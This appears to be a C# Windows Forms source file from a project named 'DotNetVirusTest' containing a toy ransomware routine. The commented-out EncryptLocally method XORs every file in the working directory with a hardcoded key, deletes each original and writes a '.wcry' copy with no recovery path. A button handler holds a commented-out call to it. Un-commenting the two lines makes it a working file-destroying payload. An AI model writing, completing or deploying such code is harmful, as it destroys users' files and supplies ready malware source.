using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DotNetVirusTest
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        /*
        private void EncryptLocally()
        {
            byte[] secretKey = Encoding.ASCII.GetBytes("sd9834kllsd09kdsdsfoi439iod");
            string currentDirectory = System.IO.Directory.GetCurrentDirectory();
            string[] filesInDirectory = System.IO.Directory.GetFiles(currentDirectory, "*");

            foreach (string s in filesInDirectory)
            {
                if (!s.Equals(System.Reflection.Assembly.GetEntryAssembly().Location))
                {
                    byte[] doomedFile = System.IO.File.ReadAllBytes(s);
                    int biggestLen = Math.Max(doomedFile.Length, secretKey.Length);

                    byte[] finalBytes = new byte[biggestLen];

                    for (int i = 0; i < biggestLen; i++)
                    {
                        finalBytes[i] =
                            (byte)(doomedFile[i%doomedFile.Length] ^ secretKey[i%secretKey.Length]);
                    }

                    System.IO.File.Delete(s);
                    System.IO.File.WriteAllBytes(s + ".wcry", finalBytes);
                }
            }
        }
        */

        private void button1_Click(object sender, EventArgs e)
        {
            // EncryptLocally();
        }
    }
}
